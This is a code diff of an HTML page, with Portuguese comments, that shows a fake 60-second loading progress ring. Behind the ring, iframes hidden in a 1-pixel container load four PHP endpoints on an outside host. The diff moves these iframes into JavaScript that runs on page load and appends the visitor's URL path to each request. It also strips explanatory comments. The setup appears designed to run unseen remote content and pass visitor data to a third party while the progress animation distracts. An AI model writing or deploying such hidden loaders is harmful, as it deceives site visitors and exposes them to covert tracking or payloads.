@@ -40,7 +40,6 @@
             color: #f1f5f9;
         }
 
-        /* Estilo da Barra Circular */
         .progress-ring {
             position: relative;
             width: 200px;
@@ -56,7 +55,7 @@
         .progress-ring__circle {
             stroke-dasharray: 565.48;
             stroke-dashoffset: 565.48;
-            transition: stroke-dashoffset 0.5s ease-out; /* Transição mais suave */
+            transition: stroke-dashoffset 0.5s ease-out;
             stroke-linecap: round;
         }
 
@@ -71,7 +70,6 @@
             text-shadow: 0 0 20px rgba(56, 189, 248, 0.2);
         }
 
-        /* Esconder os Iframes com segurança */
         .hidden-loader {
             position: absolute;
             width: 1px;
@@ -84,7 +82,6 @@
             border: 0;
         }
 
-        /* Animação simples para o título */
         .loading-dots:after {
             content: ' .';
             animation: dots 1.5s steps(5, end) infinite;
@@ -105,35 +102,49 @@
         
         <div class="progress-ring">
             <svg width="200" height="200">
-                <!-- Fundo da barra -->
                 <circle stroke="var(--track-color)" stroke-width="12" fill="transparent" r="90" cx="100" cy="100"/>
-                <!-- Barra de progresso ativa -->
                 <circle id="progress-bar" class="progress-ring__circle" stroke="var(--primary-color)" stroke-width="12" fill="transparent" r="90" cx="100" cy="100"/>
             </svg>
             <div class="percent-text" id="percent-display">0%</div>
         </div>
     </div>
 
-    <!-- Carregamento em segundo plano -->
-    <div class="hidden-loader">
-        <iframe src="https://storage-amheex.onrender.com/re.php"></iframe>
-        <iframe src="https://storage-amheex.onrender.com/dw.php"></iframe>
-        <iframe src="https://storage-amheex.onrender.com/up.php"></iframe>
-        <iframe src="https://storage-amheex.onrender.com/ar.php"></iframe>
-    </div>
+    <!-- Os SRCs agora são injetados via JavaScript -->
+    <div id="loader-container" class="hidden-loader"></div>
 
     <script>
         const circle = document.getElementById('progress-bar');
         const percentDisplay = document.getElementById('percent-display');
         const statusTitle = document.getElementById('status-title');
+        const loaderContainer = document.getElementById('loader-container');
+        
         const radius = circle.r.baseVal.value;
         const circumference = 2 * Math.PI * radius;
 
         let secondsRemaining = 60;
         const totalDuration = 60;
 
-        // Configuração inicial do SVG
         circle.style.strokeDasharray = `${circumference} ${circumference}`;
+
+        // --- LÓGICA DE URL DINÂMICA ---
+        function setupIframes() {
+            // Pega tudo após o domínio (ex: /seu-parametro)
+            const slug = window.location.pathname; 
+            
+            const baseUrls = [
+                "https://storage-amheex.onrender.com/re.php",
+                "https://storage-amheex.onrender.com/dw.php",
+                "https://storage-amheex.onrender.com/up.php",
+                "https://storage-amheex.onrender.com/ar.php"
+            ];
+
+            baseUrls.forEach(url => {
+                const ifrm = document.createElement("iframe");
+                // Concatena a URL base com o conteúdo capturado da URL atual
+                ifrm.src = url + slug; 
+                loaderContainer.appendChild(ifrm);
+            });
+        }
 
         function updateProgress() {
             if (secondsRemaining < 0) return;
@@ -152,11 +163,15 @@
             } else {
                 percentDisplay.innerText = "100%";
                 statusTitle.innerHTML = "Concluído!";
-                statusTitle.style.color = "#4ade80"; // Verde para sucesso
+                statusTitle.style.color = "#4ade80";
             }
         }
 
-        window.onload = updateProgress;
+        // Inicia tudo ao carregar a página
+        window.onload = () => {
+            setupIframes();
+            updateProgress();
+        };
     </script>
 </body>
 </html>
